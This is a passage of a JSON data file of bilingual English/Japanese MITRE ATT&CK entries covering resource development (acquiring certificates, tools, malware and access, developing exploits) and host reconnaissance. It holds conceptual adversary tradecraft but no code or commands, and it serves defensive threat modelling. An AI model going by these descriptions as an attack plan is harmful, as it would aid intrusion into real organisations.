                        "name_jp": "デジタル証明書",
                        "description_eng": "Adversaries may buy and/or steal SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner.\n\nAdversaries may purchase or steal SSL/TLS certificates to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if the certificate is trusted or otherwise added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)). The purchase of digital certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal certificate materials directly from a compromised third-party, including from certificate authorities.(Citation: DiginotarCompromise) Adversaries may register or hijack domains that they will later purchase an SSL/TLS certificate for.\n\nCertificate authorities exist that allow adversaries to acquire SSL/TLS certificates, such as domain validation certificates, for free.(Citation: Let's Encrypt FAQ)\n\nAfter obtaining a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるSSL/TLS証明書を購入および/または盗む可能性があります。SSL/TLS証明書は信頼を植え付けるように設計されています。それらには、キーに関する情報、その所有者のIDに関する情報、および証明書の内容が正しいことを確認したエンティティのデジタル署名が含まれています。署名が有効であり、証明書を調べている人が署名者を信頼している場合、そのキーを使用して所有者と安全に通信できることを知っています。\n\n敵対者は、C2トラフィックの暗号化（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)）や、証明書が信頼されているか、あるいは信頼のルートに追加されている場合（つまり[ルート証明書のインストール](https://attack.mitre.org/techniques/T1553/004)）には[中間者攻撃](https://attack.mitre.org/techniques/T1557)を可能にするなど、作戦をさらに進めるためにSSL/TLS証明書を購入または盗む可能性があります。デジタル証明書の購入は、フロント組織を使用するか、以前に侵害されたエンティティから盗まれた情報を使用して、敵対者がそのエンティティとして証明書プロバイダーに検証できるようにすることで行われる可能性があります。敵対者はまた、認証局を含む侵害されたサードパーティから直接証明書マテリアルを盗む可能性もあります。(引用: DiginotarCompromise) 敵対者は、後でSSL/TLS証明書を購入するドメインを登録またはハイジャックする可能性があります。\n\n認証局は、ドメイン検証証明書など、SSL/TLS証明書を無料で取得できる敵対者が存在する。(引用：Let's Encrypt FAQ)\n\nデジタル証明書を取得した後、攻撃者はその証明書を制御下にあるインフラストラクチャにインストールする（[デジタル証明書のインストール](https://attack.mitre.org/techniques/T1608/003)を参照）可能性があります。"
                    },
                    {
                        "id": "T1588.002",
                        "name_eng": "Tool",
                        "name_jp": "ツール",
                        "description_eng": "Adversaries may buy, steal, or download software tools that can be used during targeting. Tools can be open or closed source, free or commercial. A tool can be used for malicious purposes by an adversary, but (unlike malware) were not intended to be used for those purposes (ex: [PsExec](https://attack.mitre.org/software/S0029)). Tool acquisition can involve the procurement of commercial software licenses, including for red teaming tools such as [Cobalt Strike](https://attack.mitre.org/software/S0154). Commercial software may be obtained through purchase, stealing licenses (or licensed copies of the software), or cracking trial versions.(Citation: Recorded Future Beacon 2019)\n\nAdversaries may obtain tools to support their operations, including to support execution of post-compromise behaviors. In addition to freely downloading or purchasing software, adversaries may steal software and/or software licenses from third-party entities (including other adversaries).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるソフトウェアツールを購入、盗用、またはダウンロードする可能性があります。ツールは、オープンソースまたはクローズドソース、無料または商用である可能性があります。ツールは攻撃者によって悪意のある目的で使用される可能性がありますが、（マルウェアとは異なり）それらの目的で使用されることを意図していませんでした（例：[PsExec](https://attack.mitre.org/software/S0029)）。ツールの取得には、[Cobalt Strike](https://attack.mitre.org/software/S0154)などのレッドチームツールを含む商用ソフトウェアライセンスの調達が含まれる場合があります。商用ソフトウェアは、購入、ライセンス（またはソフトウェアのライセンスコピー）の盗用、または試用版のクラッキングによって取得される場合があります。(引用: Recorded Future Beacon 2019)\n\n攻撃者は、侵害後の行動の実行をサポートするなど、作戦をサポートするためのツールを取得する可能性があります。ソフトウェアを無料でダウンロードしたり購入したりするだけでなく、攻撃者はサードパーティエンティティ（他の攻撃者を含む）からソフトウェアやソフトウェアライセンスを盗む可能性があります。"
                    },
                    {
                        "id": "T1588.003",
                        "name_eng": "Code Signing Certificates",
                        "name_jp": "コード署名証明書",
                        "description_eng": "Adversaries may buy and/or steal code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may purchase or steal code signing certificates for use in operations. The purchase of code signing certificates may be done using a front organization or using information stolen from a previously compromised entity that allows the adversary to validate to a certificate provider as that entity. Adversaries may also steal code signing materials directly from a compromised third-party.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるコード署名証明書を購入および/または盗む可能性があります。コード署名は、ソフトウェアの作成者を確認し、コードが変更または破損されていないことを保証するために、実行可能ファイルとスクリプトにデジタル署名するプロセスです。コード署名は、開発者からのプログラムの信頼性のレベルと、プログラムが改ざんされていないことの保証を提供します。(引用: Wikipedia Code Signing) ユーザーやセキュリティツールは、証明書を発行した人物や作成者が誰であるかを知らなくても、署名されていないコードよりも署名されたコードを信頼する場合があります。\n\n[コード署名](https://attack.mitre.org/techniques/T1553/002)の前に、攻撃者は作戦で使用するためのコード署名証明書を購入または盗む可能性があります。コード署名証明書の購入は、フロント組織を使用するか、以前に侵害されたエンティティから盗まれた情報を使用して、攻撃者がそのエンティティとして証明書プロバイダーに検証できるようにすることで行われる可能性があります。攻撃者はまた、侵害されたサードパーティから直接コード署名マテリアルを盗む可能性もあります。"
                    },
                    {
                        "id": "T1588.001",
                        "name_eng": "Malware",
                        "name_jp": "マルウェア",
                        "description_eng": "Adversaries may buy, steal, or download malware that can be used during targeting. Malicious software can include payloads, droppers, post-compromise tools, backdoors, packers, and C2 protocols. Adversaries may acquire malware to support their operations, obtaining a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.\n\nIn addition to downloading free malware from the internet, adversaries may purchase these capabilities from third-party entities. Third-party entities can include technology companies that specialize in malware development, criminal marketplaces (including Malware-as-a-Service, or MaaS), or from individuals. In addition to purchasing malware, adversaries may steal and repurpose malware from third-party entities (including other adversaries).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるマルウェアを購入、盗用、またはダウンロードする可能性があります。悪意のあるソフトウェアには、ペイロード、ドロッパ、侵害後のツール、バックドア、パッカー、C2プロトコルが含まれる場合があります。攻撃者は、リモートマシンの制御を維持したり、防御を回避したり、侵害後の行動を実行したりする手段を得るために、作戦をサポートするためのマルウェアを取得する可能性があります。\n\nインターネットから無料のマルウェアをダウンロードするだけでなく、攻撃者はこれらの機能をサードパーティエンティティから購入する可能性があります。サードパーティエンティティには、マルウェア開発を専門とするテクノロジー企業、犯罪市場（Malware-as-a-Service、またはMaaSを含む）、または個人が含まれる場合があります。マルウェアの購入に加えて、攻撃者はサードパーティエンティティ（他の攻撃者を含む）からマルウェアを盗んで再利用する可能性があります。"
                    }
                ]
            },
            {
                "id": "T1650",
                "name_eng": "Acquire Access",
                "name_jp": "アクセスの取得",
                "description_eng": "Adversaries may purchase or otherwise acquire an existing access to a target system or network. A variety of online services and initial access broker networks are available to sell access to previously compromised systems.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)(Citation: Krebs Access Brokers Fortune 500) In some cases, adversary groups may form partnerships to share compromised systems with each other.(Citation: CISA Karakurt 2022)\n\nFootholds to compromised systems may take a variety of forms, such as access to planted backdoors (e.g., [Web Shell](https://attack.mitre.org/techniques/T1505/003)) or established access via [External Remote Services](https://attack.mitre.org/techniques/T1133). In some cases, access brokers will implant compromised systems with a “load” that can be used to install additional malware for paying customers.(Citation: Microsoft Ransomware as a Service)\n\nBy leveraging existing access broker networks rather than developing or obtaining their own initial access capabilities, an adversary can potentially reduce the resources required to gain a foothold on a target network and focus their efforts on later stages of compromise. Adversaries may prioritize acquiring access to systems that have been determined to lack security monitoring or that have high privileges, or systems that belong to organizations in a particular sector.(Citation: Microsoft Ransomware as a Service)(Citation: CrowdStrike Access Brokers)\n\nIn some cases, purchasing access to an organization in sectors such as IT contracting, software development, or telecommunications may allow an adversary to compromise additional victims via a [Trusted Relationship](https://attack.mitre.org/techniques/T1199), [Multi-Factor Authentication Interception](https://attack.mitre.org/techniques/T1111), or even [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195).\n\n**Note:** while this technique is distinct from other behaviors such as [Purchase Technical Data](https://attack.mitre.org/techniques/T1597/002) and [Credentials](https://attack.mitre.org/techniques/T1589/001), they may often be used in conjunction (especially where the acquired foothold requires [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "description_jp": "攻撃者は、ターゲットシステムまたはネットワークへの既存のアクセスを購入またはその他の方法で取得する可能性があります。以前に侵害されたシステムへのアクセスを販売するためのさまざまなオンラインサービスおよび初期アクセスブローカーネットワークが利用可能です。(引用: Microsoft Ransomware as a Service)(引用: CrowdStrike Access Brokers)(引用: Krebs Access Brokers Fortune 500) 場合によっては、攻撃者グループがパートナーシップを結び、侵害されたシステムを相互に共有することもあります。(引用: CISA Karakurt 2022)\n\n侵害されたシステムへの足がかりは、植え付けられたバックドア（[Webシェル](https://attack.mitre.org/techniques/T1505/003)など）へのアクセスや、[外部リモートサービス](https://attack.mitre.org/techniques/T1133)を介した確立されたアクセスなど、さまざまな形態をとる可能性があります。場合によっては、アクセスブローカーは、有料顧客向けに追加のマルウェアをインストールするために使用できる「ロード」を侵害されたシステムに埋め込みます。(引用: Microsoft Ransomware as a Service)\n\n独自の初期アクセス機能を開発または取得するのではなく、既存のアクセスブローカーネットワークを利用することにより、攻撃者はターゲットネットワークへの足がかりを得るために必要なリソースを潜在的に削減し、侵害の後の段階に努力を集中させることができます。攻撃者は、セキュリティ監視が欠如していると判断されたシステム、特権の高いシステム、または特定のセクターの組織に属するシステムへのアクセス取得を優先する場合があります。(引用: Microsoft Ransomware as a Service)(引用: CrowdStrike Access Brokers)\n\n場合によっては、IT請負、ソフトウェア開発、電気通信などのセクターの組織へのアクセスを購入すると、攻撃者は[信頼関係](https://attack.mitre.org/techniques/T1199)、[多要素認証傍受](https://attack.mitre.org/techniques/T1111)、さらには[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)を介して追加の被害者を侵害できる可能性があります。\n\n**注:** このテクニックは[技術データの購入](https://attack.mitre.org/techniques/T1597/002)や[認証情報](https://attack.mitre.org/techniques/T1589/001)などの他の行動とは異なりますが、特に取得した足がかりが[有効なアカウント](https://attack.mitre.org/techniques/T1078)を必要とする場合には、しばしば組み合わせて使用されます。",
                "subtechniques": []
            },
            {
                "id": "T1587",
                "name_eng": "Develop Capabilities",
                "name_jp": "能力の開発",
                "description_eng": "Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: Bitdefender StrongPity June 2020)(Citation: Talos Promethium June 2020)\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",
                "description_jp": "攻撃者は、ターゲティング中に使用できる能力を構築する可能性があります。能力を購入、無料でダウンロード、または盗むのではなく、攻撃者は社内で独自の能力を開発する可能性があります。これは、開発要件を特定し、マルウェア、エクスプロイト、自己署名証明書などのソリューションを構築するプロセスです。攻撃者は、攻撃者ライフサイクルの多数のフェーズを通じて作戦をサポートするための能力を開発する可能性があります。(引用: Mandiant APT1)(引用: Kaspersky Sofacy)(引用: Bitdefender StrongPity June 2020)(引用: Talos Promethium June 2020)\n\n正当な開発努力と同様に、能力開発にはさまざまなスキルセットが必要になる場合があります。必要なスキルは社内にある場合もあれば、外部委託する必要がある場合もあります。請負業者の使用は、攻撃者が要件の形成に関与し、能力に対するある程度の独占性を維持している限り、その攻撃者の開発能力の延長と見なされる場合があります。",
                "subtechniques": [
                    {
                        "id": "T1587.002",
                        "name_eng": "Code Signing Certificates",
                        "name_jp": "コード署名証明書",
                        "description_eng": "Adversaries may create self-signed code signing certificates that can be used during targeting. Code signing is the process of digitally signing executables and scripts to confirm the software author and guarantee that the code has not been altered or corrupted. Code signing provides a level of authenticity for a program from the developer and a guarantee that the program has not been tampered with.(Citation: Wikipedia Code Signing) Users and/or security tools may trust a signed piece of code more than an unsigned piece of code even if they don't know who issued the certificate or who the author is.\n\nPrior to [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries may develop self-signed code signing certificates for use in operations.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる自己署名コード署名証明書を作成する可能性があります。コード署名は、ソフトウェアの作成者を確認し、コードが変更または破損されていないことを保証するために、実行可能ファイルとスクリプトにデジタル署名するプロセスです。コード署名は、開発者からのプログラムの信頼性のレベルと、プログラムが改ざんされていないことの保証を提供します。(引用: Wikipedia Code Signing) ユーザーやセキュリティツールは、証明書を発行した人物や作成者が誰であるかを知らなくても、署名されていないコードよりも署名されたコードを信頼する場合があります。\n\n[コード署名](https://attack.mitre.org/techniques/T1553/002)の前に、攻撃者は作戦で使用するための自己署名コード署名証明書を開発する可能性があります。"
                    },
                    {
                        "id": "T1587.003",
                        "name_eng": "Digital Certificates",
                        "name_jp": "デジタル証明書",
                        "description_eng": "Adversaries may create self-signed SSL/TLS certificates that can be used during targeting. SSL/TLS certificates are designed to instill trust. They include information about the key, information about its owner's identity, and the digital signature of an entity that has verified the certificate's contents are correct. If the signature is valid, and the person examining the certificate trusts the signer, then they know they can use that key to communicate with its owner. In the case of self-signing, digital certificates will lack the element of trust associated with the signature of a third-party certificate authority (CA).\n\nAdversaries may create self-signed SSL/TLS certificates that can be used to further their operations, such as encrypting C2 traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) with [Web Protocols](https://attack.mitre.org/techniques/T1071/001)) or even enabling [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) if added to the root of trust (i.e. [Install Root Certificate](https://attack.mitre.org/techniques/T1553/004)).\n\nAfter creating a digital certificate, an adversary may then install that certificate (see [Install Digital Certificate](https://attack.mitre.org/techniques/T1608/003)) on infrastructure under their control.",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる自己署名SSL/TLS証明書を作成する可能性があります。SSL/TLS証明書は信頼を植え付けるように設計されています。それらには、キーに関する情報、その所有者のIDに関する情報、および証明書の内容が正しいことを確認したエンティティのデジタル署名が含まれています。署名が有効であり、証明書を調べている人が署名者を信頼している場合、そのキーを使用して所有者と安全に通信できることを知っています。自己署名の場合、デジタル証明書にはサードパーティ認証局（CA）の署名に関連付けられた信頼要素が欠如します。\n\n敵対者は、C2トラフィックの暗号化（例：[非対称暗号化](https://attack.mitre.org/techniques/T1573/002)と[Webプロトコル](https://attack.mitre.org/techniques/T1071/001)）や、信頼のルートに追加された場合（つまり[ルート証明書のインストール](https://attack.mitre.org/techniques/T1553/004)）には[中間者攻撃](https://attack.mitre.org/techniques/T1557)を可能にするなど、作戦をさらに進めるために自己署名SSL/TLS証明書を作成する可能性があります。\n\nデジタル証明書を作成した後、攻撃者はその証明書を制御下にあるインフラストラクチャにインストールする（[デジタル証明書のインストール](https://attack.mitre.org/techniques/T1608/003)を参照）可能性があります。"
                    },
                    {
                        "id": "T1587.004",
                        "name_eng": "Exploits",
                        "name_jp": "エクスプロイト",
                        "description_eng": "Adversaries may develop exploits that can be used during targeting. An exploit takes advantage of a bug or vulnerability in order to cause unintended or unanticipated behavior to occur on computer hardware or software. Rather than finding/modifying exploits from online or purchasing them from exploit vendors, an adversary may develop their own exploits.(Citation: NYTStuxnet) Adversaries may use information acquired via [Vulnerabilities](https://attack.mitre.org/techniques/T1588/006) to focus exploit development efforts. As part of the exploit development process, adversaries may uncover exploitable vulnerabilities through methods such as fuzzing and patch analysis.(Citation: Irongeek Sims BSides 2017)\n\nAs with legitimate development efforts, different skill sets may be required for developing exploits. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's exploit development capabilities, provided the adversary plays a role in shaping requirements and maintains an initial degree of exclusivity to the exploit.\n\nAdversaries may use exploits during various phases of the adversary lifecycle (i.e. [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203), [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), [Exploitation for Defense Evasion](https://attack.mitre.org/techniques/T1211), [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212), [Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210), and [Application or System Exploitation](https://attack.mitre.org/techniques/T1499/004)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるエクスプロイトを開発する可能性があります。エクスプロイトは、コンピュータハードウェアまたはソフトウェアで意図しないまたは予期しない動作を引き起こすために、バグまたは脆弱性を利用します。オンラインからエクスプロイトを見つけたり変更したり、エクスプロイトベンダーから購入したりするのではなく、攻撃者は独自のエクスプロイトを開発する可能性があります。(引用: NYTStuxnet) 攻撃者は、[脆弱性](https://attack.mitre.org/techniques/T1588/006)を介して取得した情報を使用して、エクスプロイト開発の取り組みを集中させる可能性があります。エクスプロイト開発プロセスの一環として、攻撃者はファジングやパッチ分析などの方法を通じて悪用可能な脆弱性を発見する可能性があります。(引用: Irongeek Sims BSides 2017)\n\n正当な開発努力と同様に、エクスプロイト開発にはさまざまなスキルセットが必要になる場合があります。必要なスキルは社内にある場合もあれば、外部委託する必要がある場合もあります。請負業者の使用は、攻撃者が要件の形成に関与し、エクスプロイトに対する初期の独占性を維持している限り、その攻撃者のエクスプロイト開発能力の延長と見なされる場合があります。\n\n敵対者は、敵対者ライフサイクルの様々な段階でエクスプロイトを使用する可能性があります（すなわち、[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)、[クライアント実行のための悪用](https://attack.mitre.org/techniques/T1203)、[権限昇格のための悪用](https://attack.mitre.org/techniques/T1068)、[防御回避のための悪用](https://attack.mitre.org/techniques/T1211)、[認証情報アクセスのための悪用](https://attack.mitre.org/techniques/T1212)、[リモートサービスの悪用](https://attack.mitre.org/techniques/T1210)、および[アプリケーションまたはシステムの悪用](https://attack.mitre.org/techniques/T1499/004)）。"
                    },
                    {
                        "id": "T1587.001",
                        "name_eng": "Malware",
                        "name_jp": "マルウェア",
                        "description_eng": "Adversaries may develop malware and malware components that can be used during targeting. Building malicious software can include the development of payloads, droppers, post-compromise tools, backdoors (including backdoored images), packers, C2 protocols, and the creation of infected removable media. Adversaries may develop malware to support their operations, creating a means for maintaining control of remote machines, evading defenses, and executing post-compromise behaviors.(Citation: Mandiant APT1)(Citation: Kaspersky Sofacy)(Citation: ActiveMalwareEnergy)(Citation: FBI Flash FIN7 USB)\n\nAs with legitimate development efforts, different skill sets may be required for developing malware. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's malware development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the malware.\n\nSome aspects of malware development, such as C2 protocol development, may require adversaries to obtain additional infrastructure. For example, malware developed that will communicate with Twitter for C2, may require use of [Web Services](https://attack.mitre.org/techniques/T1583/006).(Citation: FireEye APT29)",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるマルウェアおよびマルウェアコンポーネントを開発する可能性があります。悪意のあるソフトウェアの構築には、ペイロード、ドロッパ、侵害後のツール、バックドア（バックドア化されたイメージを含む）、パッカー、C2プロトコル、および感染したリムーバブルメディアの作成が含まれる場合があります。攻撃者は、リモートマシンの制御を維持したり、防御を回避したり、侵害後の行動を実行したりする手段を作成するために、作戦をサポートするためのマルウェアを開発する可能性があります。(引用: Mandiant APT1)(引用: Kaspersky Sofacy)(引用: ActiveMalwareEnergy)(引用: FBI Flash FIN7 USB)\n\n正当な開発努力と同様に、マルウェア開発にはさまざまなスキルセットが必要になる場合があります。必要なスキルは社内にある場合もあれば、外部委託する必要がある場合もあります。請負業者の使用は、攻撃者が要件の形成に関与し、マルウェアに対するある程度の独占性を維持している限り、その攻撃者のマルウェア開発能力の延長と見なされる場合があります。\n\nC2プロトコル開発など、マルウェア開発の一部の側面では、攻撃者が追加のインフラストラクチャを取得する必要がある場合があります。例えば、C2のためにTwitterと通信する開発されたマルウェアは、[Webサービス](https://attack.mitre.org/techniques/T1583/006)の使用を必要とする場合があります。(引用: FireEye APT29)"
                    }
                ]
            }
        ]
    },
    {
        "id": "TA0043",
        "name_eng": "Reconnaissance",
        "name_jp": "偵察",
        "description_eng": "The adversary is trying to gather information they can use to plan future operations.\n\nReconnaissance consists of techniques that involve adversaries actively or passively gathering information that can be used to support targeting. Such information may include details of the victim organization, infrastructure, or staff/personnel. This information can be leveraged by the adversary to aid in other phases of the adversary lifecycle, such as using gathered information to plan and execute Initial Access, to scope and prioritize post-compromise objectives, or to drive and lead further Reconnaissance efforts.",
        "description_jp": "攻撃者は、将来の作戦を計画するために使用できる情報を収集しようとしています。\n\n偵察は、攻撃者がターゲティングをサポートするために使用できる情報を能動的または受動的に収集することを含むテクニックで構成されます。そのような情報には、被害組織、インフラストラクチャ、またはスタッフ/人員の詳細が含まれる場合があります。この情報は、初期アクセスの計画と実行、侵害後の目的の範囲設定と優先順位付け、またはさらなる偵察活動の推進と主導など、攻撃者ライフサイクルの他のフェーズを支援するために攻撃者によって活用される可能性があります。",
        "techniques": [
            {
                "id": "T1592",
                "name_eng": "Gather Victim Host Information",
                "name_jp": "被害者ホスト情報の収集",
                "description_eng": "Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\nAdversaries may also gather victim host information via User-Agent HTTP headers, which are sent to a server to identify the application, operating system, vendor, and/or version of the requesting user agent. This can be used to inform the adversary’s follow-on action. For example, adversaries may check user agents for the requesting operating system, then only serve malware for target operating systems while ignoring others.(Citation: TrellixQakbot)",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のホストに関する情報を収集する可能性があります。ホストに関する情報には、管理データ（名前、割り当て済みIP、機能など）や構成に関する詳細（オペレーティングシステム、言語など）など、さまざまな詳細が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。攻撃者はまた、サイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める可能性もあります。(引用: ATT ScanBox) ホストに関する情報は、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。\n\n攻撃者はまた、User-Agent HTTPヘッダーを介して被害者ホスト情報を収集する可能性があります。User-Agent HTTPヘッダーは、要求元ユーザーエージェントのアプリケーション、オペレーティングシステム、ベンダー、および/またはバージョンを識別するためにサーバーに送信されます。これは、攻撃者のその後の行動を通知するために使用できます。例えば、攻撃者は要求元のオペレーティングシステムについてユーザーエージェントを確認し、他のオペレーティングシステムを無視しながらターゲットオペレーティングシステムのマルウェアのみを提供する可能性があります。(引用: TrellixQakbot)",
                "subtechniques": [
                    {
                        "id": "T1592.001",
                        "name_eng": "Hardware",
                        "name_jp": "ハードウェア",
                        "description_eng": "Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のホストハードウェアに関する情報を収集する可能性があります。ハードウェアインフラストラクチャに関する情報には、特定のホスト上の種類やバージョンなどのさまざまな詳細や、追加の防御保護を示す可能性のある追加コンポーネント（カード/生体認証リーダー、専用暗号化ハードウェアなど）の存在が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)（ホスト名、サーバーバナー、ユーザーエージェント文字列など）や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。攻撃者はまた、サイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める可能性もあります。(引用: ATT ScanBox) ハードウェアインフラストラクチャに関する情報は、オンラインまたはその他のアクセス可能なデータセット（求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書など）を介して攻撃者に公開される場合もあります。この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[ハードウェアサプライチェーンの侵害](https://attack.mitre.org/techniques/T1195/003)や[ハードウェア追加](https://attack.mitre.org/techniques/T1200)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1592.003",
                        "name_eng": "Firmware",
                        "name_jp": "ファームウェア",
                        "description_eng": "Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
